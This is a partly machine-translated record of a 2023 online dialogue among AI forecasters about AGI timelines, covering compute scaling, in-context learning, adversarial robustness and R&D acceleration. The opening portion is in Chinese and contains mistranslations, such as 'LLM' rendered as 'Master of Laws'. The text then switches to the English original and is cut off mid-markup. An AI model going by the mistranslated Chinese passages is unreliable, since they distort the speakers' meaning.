user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 17:35:24 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>埃格·埃尔迪尔</b></section><div><p>我认为我与阿杰亚和丹尼尔的具体分歧可能有点不同，但一个重要的元层面观点是我对暗示疯狂结论的论点普遍持怀疑态度。这与未来 10 年或 20 年能源消耗将增加 3 OOM 的预测尤其相关。可以讲述一个引人入胜的故事来说明为什么会发生这种情况，但也可以做相反的事情，并且判断这些论点应该有多么令人信服对我来说很困难。 </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 17:38:16 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 17:38:16 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>丹尼尔·科科塔洛</b></section><div><p>好吧，作为对 Ege 的回应，我想我们不同意这个“结论是疯狂的，因此不太可能”的因素。我认为对于这样的事情，相对于其他技术（例如模型、不同观点的人之间的辩论、不同观点的人之间基于模型的辩论），这是一个相当糟糕的真理指南，我不确定如何在解决这个问题上取得进展症结。 Ege，你说它主要是为了 1000 倍的能耗；想专注于讨论其他问题吗？ </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 17:40:43 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 17:40:43 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>埃格·埃尔迪尔</b></section><div><p>当然，先讨论另一个问题就可以了。<br><br>不过，我不确定为什么你认为“我对具体论点没有更新太多，因为我对自己这样做的能力持怀疑态度”这样的启发式方法是无效的。例如，这似乎违背了<a href="https://www.lesswrong.com/posts/TNWnK9g2EeRnQA8Dg/never-go-full-kelly">这篇文章</a>中的分数凯利投注启发式，我总体上会赞同这种启发式：您希望在某种程度上顺从市场，因为您的模型很可能出错。<br><br>不过，我不知道现在是否值得继续这个话题，所以现在专注于第一个问题可能会更有成效。<br><br>我认为我对第一个问题的更广泛分布也受到相同的高级启发式的影响，尽管程度较小。从某种意义上说，如果我要完全以你和 Ajeya 似乎拥有的关于人工智能可能如何发展的基于计算的模型为条件，我可能会为第一个问题得出一个或多或少的概率分布同意阿杰亚的观点。 </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 17:48:26 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 17:48:26 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>哈布里卡</b></section><div><p>那很有意思。我认为深入研究这一点对我来说似乎很好。</p><p>您能多谈谈您是如何从高层次考虑这个问题的吗？我的猜测是你有一堆广泛的启发法，其中一些有点像“好吧，市场似乎并不认为 AGI 很快就会发生？”，然后这些扩大了你的概率质量，但我不知道这是否是一个不错的描述，并且有兴趣了解更多推动这一描述的启发式方法。 </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 17:53:33 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 17:53:33 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>埃格·埃尔迪尔</b></section><div><p>我不确定我是否会在不认为这种情况很快就会发生的情况下对市场给予如此大的重视，因为我认为，如果市场<i>确实</i>认为这种情况很快就会发生，那么实际上很难判断市场价格会是什么样子。<br><br>抛开有关市场的观点，阐述我的其余观点：我有 50% 的可能性，在 30 年后，我会回顾<a href="https://www.lesswrong.com/posts/Gc9FGtdXhK9sCSEYu/what-a-compute-centric-framework-says-about-ai-takeoff">汤姆·戴维森 (Tom Davidson) 的起飞模型</a>，并说“这个模型捕获了全部或大部分预测人工智能发展可能如何进行时的相关考虑因素”。对我来说，在这样一个不确定的领域中，对于特定类别的模型来说，这已经是相当高的可信度了。<br><br>然而，如果这个框架存在严重错误，我的时间线就会变得更长，因为如果扩展路径不可用，我看不到从我们现在的位置到 AGI 的其他清晰路径。可能还有其他途径（例如大量的软件进步），但它们似乎不那么引人注目。<br><br>如果我认为汤姆·戴维森（Tom Davidson）的起飞模型（以及我个人一直在研究的一些较新版本）基本上是正确的，那么我的预测看起来将与该模型的预测非常相似，并且基于我在如果我认为这些模型和参数范围是合理的，我想我最终会在第一个问题上同意 Ajeya 的观点。<br><br>这个解释是否让我的观点更加清晰了？ </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 17:57:12 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 17:57:12 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>哈布里卡</b></section><div><blockquote><p>然而，如果这个框架存在严重错误，我的时间线就会变得更长，因为如果扩展路径不可用，我看不到从我们现在的位置到 AGI 的其他清晰路径。可能还有其他途径（例如大量的软件进步），但它们似乎不那么引人注目。</p></blockquote><p>我认为这部分确实有帮助。</p><p>我目前将您的观点描述为“好吧，也许我们需要的只是增加计算规模并做一些比这更容易的事情（因此将在我们有足够的计算时完成）。但如果这是错误的，预测当我们实现 AGI 时会变得更加困难，因为我们对于如何实现 AGI 并没有任何其他具体的候选假设，这意味着事情何时发生存在巨大的不确定性”。 </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 18:00:13 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 18:00:13 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>埃格·埃尔迪尔</b></section><div><blockquote><p>我目前将您的观点描述为“好吧，也许我们需要的只是增加计算规模并做一些比这更容易的事情（因此将在我们有足够的计算时完成）。但如果这是错误的，预测当我们实现 AGI 时会变得更加困难，因为我们对于如何实现 AGI 并没有任何其他具体的候选假设，这意味着事情何时发生存在巨大的不确定性”。</p></blockquote><p>这基本上是正确的，尽管我要补充一点，熵是相对的，所以在 AGI 何时到来时有一个“更不确定的分布”并没有真正的意义。你必须以某种方式选择一些你期望发生这种情况的典型时间尺度，我是说，一旦扩展超出了等式，我将默认使用更长的时间尺度，这对于我们认为可能的技术来说是有意义的，但我们没有在合理的时间表上实现的具体计划。 </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 18:03:10 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 18:03:10 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>阿杰亚·科特拉</b></section><div><blockquote><p>如果扩展路径不可用，我认为没有其他明确的路径可以实现通用人工智能。可能还有其他途径（例如大量的软件进步），但它们似乎不那么引人注目。</p></blockquote><p>我认为值得将“计算扩展”路径分成几个不同的路径，或者给予通用“计算扩展”路径更多的权重，因为它是如此广泛。特别是，我认为丹尼尔和我生活在一个更加具体的世界，而不仅仅是“更多的计算会有所帮助”；我们或多或少地想象着由法学硕士构建的代理。这与“我们可以模拟进化”等非常不同。计算扩展假设涵盖了这两个世界，以及许多更混乱的中间世界。这几乎是过去任何试图预测时间线并接近预测人工智能何时开始变得有趣的人所使用的<i>一种范式</i>。就像我认为莫拉维克现在看起来非常好一样。从某种意义上说，“即使我们的计算量很少，我们也能想出一种比自然更有效的方法来做到这一点”是一个假设，其先验权重应该小于 50%，相比之下“能力将开始变得更好”当我们谈论宏观计算量时。”</p><p>或者我可能会说，在先验中，“我们可以获得的计算越多，事情就会变得越来越有趣”和“即使我们有大量的计算，事情也会顽固地保持超级无趣，因为我们”之间的比例是50/50我们错过了计算无法帮助我们获得的深刻见解”；但当你<a href="http://www.incompleteideas.net/IncIdeas/BitterLesson.html">环顾世界</a>时，你应该朝着第一个方向努力更新。</p></div></section><h3><strong>阿杰亚</strong></h3><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 17:43:49 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 17:43:49 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>阿杰亚·科特拉</b></section><div><p>关于 Daniel 的开场白：我想我现在实际上只是同意 a) 和 b) — 或者更确切地说，我同意关于训练计算要求提出的正确问题是“有多少 GPT-N”我们认为需要跳跃到 GPT-N.5 吗？”，短期 LLM 加上修补看起来更像是“默认”，而不是“几种可能性之一”，其中其他可能性包括更强烈的元学习一步（这就是 2019-20 年的感受）。后者是我更新的时间表中<a href="https://www.lesswrong.com/posts/AfH2oPHCApdKicM4m/two-year-update-on-my-personal-ai-timelines#Picturing_a_more_specific_and_somewhat_lower_bar_for_TAI">最大的调整</a>。<br><br>尽管如此，我认为两个重要的对象级点在我的脑海中比 Daniel 更重视“所需的模型大小”和“所需的修补量”：</p><ul><li>情境学习确实看起来相当糟糕，而且似乎并没有取得很大的进步。我认为我们可以在没有真正强大的类人情境学习的情况下拥有 TAI，但它可能比我们一开始就需要更多的努力。</li><li>与此相关的是，对抗性的鲁棒性目前似乎不太好。这也感觉是可以克服的，但我认为它增加了你需要的规模（通过类比，就像 5-10 年前，视觉系统似乎对于汽车来说已经足够好了，除了长尾/对抗环境中，我认为视觉系统必须变得更大，而且必须对汽车进行更多的修补，才能达到现在它们开始可行的程度）。</li></ul><p>然后一个元层面的观点是，我（和 IIRC Metaculus，根据我的同事 Isabel 的说法）在过去几年中对缺乏基于法学硕士的酷产品感到有点惊讶（似乎 2023 年带来了酷的水平）我在 2021 年天真地想象的产品）。我认为存在一种“现实有很多细节，实际上让东西工作是一个巨大的痛苦”的动态，它为我已经拥有的“事情可能会相当连续”的启发提供了可信度。</p><p>其他一些元点：</p><ul><li> The Paul <a href="https://sideways-view.com/2023/07/29/self-driving-car-bets/">self-driving car bets</a> post was interesting to me, and I place some weight on &quot;Daniel is doing the kind of &#39;I can see how it would be done so it&#39;s only a few years away&#39; move that I think doesn&#39;t serve as a great guide to what will happen in the real world.&quot;</li><li> Carl is the person who seems like he&#39;s been the most right when we&#39;ve disagreed, so he&#39;s probably the one guy whose views I put the most weight on. But also Carl seems like he errs aggressive and errs in the direction of believing people will aggressively pursue the most optimal thing (being more surprised than I was, for a longer period of time, about how people haven&#39;t invested more in AI and accomplished more with it by now). His timelines are longer than Daniel&#39;s, and I think mine are a bit longer than his.</li><li> In general, I do count Daniel as among a pretty small set of people who were clearly on record with views more correct than mine in 2020 about both the nature of how TAI would be built (LLMs+tinkering) and how quickly things would progress. Although it&#39;s a bit complicated because 2020-me thought we&#39;d be seeing more powerful LLM products by now.</li><li> Other people who I think were more right include Carl, Jared Kaplan, Danny Hernandez, Dario, Holden, and Paul. Paul is interesting because I think he both put more weight than I did on &quot;it&#39;s just LLMs plus a lot of decomposition and tinkering&quot; but also puts more weight than either me or Daniel on &quot;things are just hard and annoying and take a long time;&quot; this left him with timelines similar to mine in 2020, and maybe a bit longer than mine now.</li><li> Oh — another point that seems interesting to discuss at some point is that I suspect Daniel generally wants to focus on a weaker endpoint because of some sociological views I disagree with. (Screened off by the fact that we were answering the same question about remotable jobs replacement, but I think hard to totally screen off.)</li></ul></div></section><h2> On in-context learning as a potential crux </h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 18:04:51 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 18:04:51 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> Re: Ajeya:</p><ul><li> Interesting, I thought the biggest adjustment to your timelines was the pre-AGI R&amp;D acceleration modelled by Davidson. That was another disagreement between us originally that ceased being a disagreement once you took that stuff into account.</li><li> re: in-context learning: I don&#39;t have much to say on this &amp; am curious to hear more. Why do you think it needs to get substantially better in order to reach AGI, and why do you think it&#39;s not on track to do so? I&#39;d bet that GPT4 is way better than GPT3 at in-context learning for example.</li><li> re: adversarial robustness: Same question I guess. My hot take would be (a) it&#39;s not actually that important, the way forward is not to never make errors in the first place but rather to notice and recover from them enough that the overall massive parallel society of LLM agents moves forward and makes progress, and (b) adversarial robustness is indeed improving. I&#39;d be curious to hear more, perhaps you have data on how fast it is improving and you extrapolate the trend and think it&#39;ll still be sucky by eg 2030?</li><li> re: schlep &amp; incompetence on the part of the AGI industry: Yep, you are right about this, and I was wrong. Your description of Carl also applies to me historically; in the past three years I&#39;ve definitely been a &quot;this is the fastest way to AGI, therefore at least one of the labs will do it with gusto&quot; kind of guy, and now I see that is wrong. I think basically I fell for the planning fallacy &amp; efficient market hypothesis fallacy.<br><br> However, I don&#39;t think this is the main crux between us, because it basically pushes things back by a few years, it doesn&#39;t eg double (on a log scale) the training requirements. My current, updated model of timelines, therefore, is that the bottleneck in the next five years is not necessarily compute but instead quite plausibly schlep &amp; conviction on the part of the labs. This is tbh a bit of a scary conclusion. </li></ul></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 18:21:37 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 18:21:37 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> re: in-context learning: I don&#39;t have much to say on this &amp; am curious to hear more. Why do you think it needs to get substantially better in order to reach AGI, and why do you think it&#39;s not on track to do so? I&#39;d bet that GPT4 is way better than GPT3 at in-context learning for example.</p></blockquote><p> The traditional image of AGI involves having an AI system that can <i>learn new (to it) skills</i> as efficiently as humans (with as few examples as humans would need to see). I think this is not how the first transformative AI system will look, because ML is less sample efficient than humans and it doesn&#39;t look like in-context learning is on track to being able to do the kind of fast sample-efficient learning that humans do. I think this is not fatal for getting TAI, because we can make up for it by a) the fact that LLMs&#39; &quot;ancestral memory&quot; contains all sorts of useful information about human disciplines that they won&#39;t need to learn in-context, and b) explicitly guiding the LLM agent to &quot;reason out loud&quot; about what lessons it should take away from its observations and putting those in an external memory it retrieves from, or similar.</p><p> I think back when Eliezer was saying that &quot;stack more layers&quot; wouldn&#39;t get us to AGI, this is one of the kinds of things he was pointing to: that cognitively, these systems didn&#39;t have the kind of learning/reflecting flexibility that you&#39;d think of re AGI. When people were talking about GPT-3&#39;s in-context learning, I thought that was one of the weakest claims by far about its impressiveness. The in-context learning at the time was like: you give it a couple of examples of translating English to French, and then you give it an English sentence, and it dutifully translate that into French. It already knew English and it already knew French (from its ancestral memory), and the thing it &quot;learned&quot; was that the game it was currently playing was to translate from English to French.</p><p> I agree that 4 is a lot better than 3 (for example, you can teach 4 new games like French Toast or Hitler and it will play them — unless it already knows that game, which is plausible). But compared to any object-level skill like coding (many of which are superhuman), in-context learning seems quite subhuman. I think this is related to how ARC Evals&#39; LLM agents kind of &quot;fell over&quot; doing things like setting up Bitcoin wallets.</p><p> Like Eliezer often says, humans evolved to hunt antelope on the savannah, and that very same genetics coding for the very same brain can build rockets and run companies. Our LLMs right now generalize further from their training distribution than skeptics in 2020 would have said, and they&#39;re generalizing further and further as they get bigger, but they have nothing like the kind of savannah-to-boardroom generalization we have. This can create lots of little issues in lots of places when an LLM will need to digest some new-to-it development and do something intelligent with it. Importantly, I don&#39;t think this is going to stop LLM-agent-based TAI from happening, but it&#39;s one concrete limitation that pushes me to thinking we&#39;ll need more scale or more schlep than it looks like we&#39;ll need before taking this into account.</p><p> Adversarial robustness, which I&#39;ll reply to in another comment, is similar: a concrete hindrance that isn&#39;t fatal but is one reason I think we&#39;ll need more scale and schlep than it seems like Daniel does (despite agreeing with his concrete counterarguments of the form &quot;we can handle it through X countermeasure&quot;). </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 18:34:30 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 18:34:30 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> Re: Ajeya: Thanks for that lengthy reply. I think I&#39;ll have to ponder it for a bit. Right now I&#39;m stuck with a feeling that we agree qualitatively but disagree quantitatively. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 18:15:08 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 18:15:08 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> I think it&#39;s worth separating the &quot;compute scaling&quot; pathway into a few different pathways, or else giving the generic &quot;compute scaling&quot; pathway more weight because it&#39;s so broad. In particular, I think Daniel and I are living in a much more specific world than just &quot;lots more compute will help;&quot; we&#39;re picturing agents built from LLMs, more or less. That&#39;s very different from eg &quot;We can simulate evolution.&quot; The compute scaling hypothesis encompasses both, as well as lots of messier in-between worlds.</p></blockquote><p> I think it&#39;s fine to incorporate these uncertainties as a wider prior over the training compute requirements, and I also agree it&#39;s a reason to put more weight on this broad class of models than you otherwise would, but I still don&#39;t find these reasons compelling enough to go significantly above 50%. It just seems pretty plausible to me that we&#39;re missing something important, even if any specific thing we can name is unlikely to be what we&#39;re missing.<br><br> To give one example, I initially thought that the evolution anchor from the Bio Anchors report looked quite solid as an upper bound, but I realized some time after that it doesn&#39;t actually have an appropriate anthropic correction and this could potentially mess things up. I now think if you work out the details this correction turns out to be inconsequential, but it didn&#39;t have to be like that: this is just a consideration that I missed when I first considered the argument. I suppose I would say I don&#39;t see a reason to trust my own reasoning abilities as much as you two seem to trust yours.</p><blockquote><p> The compute scaling hypothesis is much broader, and it&#39;s pretty much the <i>one paradigm</i> that anyone in the past who was trying to forecast timelines and got anywhere close to predicting when AI would start getting interesting used. Like I think Moravec is looking super good right now.</p></blockquote><p> My impression is that Moravec predicted in 1988 that we would have AI systems comparable to the human brain in performance around 2010. If this actually happens around 2037 (your median timelines), Moravec&#39;s forecast will have been off by around a factor of 2 in terms of the time differential from when he made the forecast. That doesn&#39;t seem &quot;super good&quot; to me.<br><br> Maybe I&#39;m wrong about exactly what Moravec predicted - I didn&#39;t read his book and my knowledge is second-hand. In any event, I would appreciate getting some more detail from you about why you think he looks good.</p><blockquote><p> Or maybe I&#39;d say on priors you could have been 50/50 between &quot;things will get more and more interesting the more compute we have access to&quot; and &quot;things will stubbornly stay super uninteresting even if we have oodles of compute because we&#39;re missing deep insights that the compute doesn&#39;t help us get&quot;; but then when you <a href="http://www.incompleteideas.net/IncIdeas/BitterLesson.html">look around at the world</a> , you should update pretty hard toward the first.</p></blockquote><p> I agree that if I were considering two models at those extremes, recent developments would update me more toward the former model. However, I don&#39;t actually disagree with the abstract claim that &quot;things will get more and more interesting the more compute we have access to&quot; - I expect more compute to make things more interesting even in worlds where we can&#39;t get to AGI by scaling compute. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 18:31:24 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 18:31:24 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> I agree that 4 is a lot better than 3 (for example, you can teach 4 new games like French Toast or Hitler and it will play them — unless it already knows that game, which is plausible).</p></blockquote><p> A local remark about this: I&#39;ve seen a bunch of reports from other people that GPT-4 is essentially unable to play tic-tac-toe, and this is a shortcoming that was highly surprising to me. Given the amount of impressive things it can otherwise do, failing at playing a simple game whose full solution could well be in its training set is really odd.<br><br> So while I agree 4 seems better than 3, it still has some bizarre weaknesses that I don&#39;t think I understand well. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 18:34:18 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 18:34:18 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> Ege: Just to check, GPT-4V (vision model) presumably can play tic-tac-toe easily? My sense is that this is just one of these situations where tokenization and one-dimensionality of text makes something hard, but it&#39;s trivial to get the system to learn it if it&#39;s in a more natural representation. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 18:35:17 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 18:35:17 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> Just to check, GPT-4V (vision model) presumably can play tic-tac-toe easily?</p></blockquote><p><br> <a href="https://twitter.com/liminal_warmth/status/1709654529413992692">This random Twitter person</a> says that it can&#39;t. Disclaimer: haven&#39;t actually checked for myself.</p></div></section><h2> Taking into account government slowdown </h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 18:05:04 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 18:05:04 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> As a quick question, to what degree do y&#39;alls forecasts above take into account governments trying to slow things down and companies intentionally going slower because of risks?</p><p> Seems like a relevant dimension that&#39;s not obviously reflected in usual compute models, and just want to make sure that&#39;s not accidentally causing some perceived divergence in people&#39;s timelines. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 18:06:58 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 18:06:58 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> I am guilty of assuming governments and corporations won&#39;t slow things down by more than a year. I think I mostly still endorse this assumption but I&#39;m hopeful that instead they&#39;ll slow things down by several years or more. Historically I&#39;ve been arguing with people who disagreed with me on timelines by decades, not years, so it didn&#39;t seem important to investigate this assumption. That said I&#39;m happy to say why I still mostly stand by it. Especially if it turns out to be an important crux (eg if Ege or Ajeya think that AGI would probably happen by 2030 absent slowdown) </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 18:08:25 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 18:08:25 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><blockquote><p> That said I&#39;m happy to say why I still mostly stand by it.</p></blockquote><p> Cool, might be worth investigating later if it turns out to be a crux. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 18:21:02 GMT" user-id="5y2XiEs9AKBnnpSx7" display-name="Ege Erdil" submitted-date="Sat, 04 Nov 2023 18:21:02 GMT" user-order="4"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ege Erdil</b></section><div><blockquote><p> As a quick question, to what degree do y&#39;alls forecasts above take into account governments trying to slow things down and companies intentionally going slower because of risks?</p><p> Seems like a relevant dimension that&#39;s not obviously reflected in usual compute models, and just want to make sure that&#39;s not accidentally causing some perceived divergence in people&#39;s timelines.</p></blockquote><p> Responding to habryka: I do think government regulations, companies slowing down because of risks, companies slowing down because they are bad at coordination, capital markets being unable to allocate the large amounts of capital needed for huge training runs for various reasons, etc. could all be important. However, my general heuristic for thinking about the issue is more &quot;there could be a lot of factors I&#39;m missing&quot; and less &quot;I think these specific factors are going to be very important&quot;.<br><br> In terms of the impact of capable AI systems, I would give significantly less than even but still non-negligible odds that these kinds of factors end up limiting the acceleration in economic growth to eg less than an order of magnitude. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 18:49:39 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 18:49:39 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> As a quick question, to what degree do y&#39;alls forecasts above take into account governments trying to slow things down and companies intentionally going slower because of risks?</p></blockquote><p> I include this in a long tail of &quot;things are just slow&quot; considerations, although in my mind it&#39;s mostly not people making a concerted effort to slow down because of x-risk, but rather just the thing that happens to any sufficiently important technology that has a lot of attention on it: a lot of drags due to the increasing number of stakeholders, both drags where companies are less blase about releasing products because of PR concerns, and drags where governments impose regulations (which I think they would have in any world, with or without the efforts of x-risk-concerned contingent). </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 18:10:53 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 18:10:53 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> Slight meta: I am interested in digging in a bit more to find some possible cruxes between Daniel and Ajeya, before going more in-depth between Ajeya and Ege, just to keep the discussion a bit more focused.</p></div></section><h2> Recursive self-improvement and AI&#39;s speeding up R&amp;D </h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 18:21:56 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 18:21:56 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>habryka</b></section><div><p> Daniel: Just for my own understanding, you have adjusted the compute-model to account for some amount of R&amp;D speedup as a result of having more AI researchers.</p><p> To what degree does that cover classical recursive self-improvements or things in that space? (Eg AI systems directly modifying their training process or weights or develop their own pre-processing modules?)</p><p> Or do you expect a feedback loop that&#39;s more &quot;AI systems do research that routes through humans understanding those insights and being in the loop on implementing them to improve the AI systems&quot;? </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 18:25:52 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 18:25:52 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Daniel Kokotajlo</b></section><div><p> When all we had was Ajeya&#39;s model, I had to make my own scrappy guess at how to adjust it to account for R&amp;D acceleration due to pre-AGI systems. Now we have Davidson&#39;s model so I mostly go with that.<br><br> It covers recursive-self-improvement as a special case. I expect that to be what the later, steeper part of the curve looks like (basically a million AutoGPTs running in parallel across several datacenters, doing AI research but 10-100x faster than humans would, with humans watching the whole thing from the sidelines clapping as metrics go up); the earlier part of the curve looks more like &quot;every AGI lab researcher has access to a team of virtual engineers that work at 10x speed and sometimes make dumb mistakes&quot; and then the earliest part of the curve is what we are seeing now with copilot and chatgpt helping engineers move slightly faster. </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 18:37:36 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 18:37:36 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> Interesting, I thought the biggest adjustment to your timelines was the pre-AGI R&amp;D acceleration modelled by Davidson. That was another disagreement between us originally that ceased being a disagreement once you took that stuff into account.</p></blockquote><p> These are entangled updates. If you&#39;re focusing on just &quot;how can you accelerate ML R&amp;D a bunch,&quot; then it seems less important to be able to handle low-feedback-loop environments quite different from the training environment. By far the biggest reason I thought we might need longer horizon training was to imbue the skill of efficiently learning very new things (see <a href="https://docs.google.com/document/d/1k7qzzn14jgE-Gbf0CON7_Py6tQUp2QNodr_8VAoDGnY/edit#heading=h.2s3orj7g2t76">here</a> ). </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 2023 18:38:01 GMT" user-id="BpJX4jYXD836kDJ8e" display-name="Ajeya Cotra" submitted-date="Sat, 04 Nov 2023 18:38:01 GMT" user-order="3"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"> <b>Ajeya Cotra</b></section><div><blockquote><p> Right now I&#39;m stuck with a feeling that we agree qualitatively but disagree quantitatively.</p></blockquote><p> I think this is basically right! </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="BpJX4jYXD836kDJ8e-Sat, 04 Nov 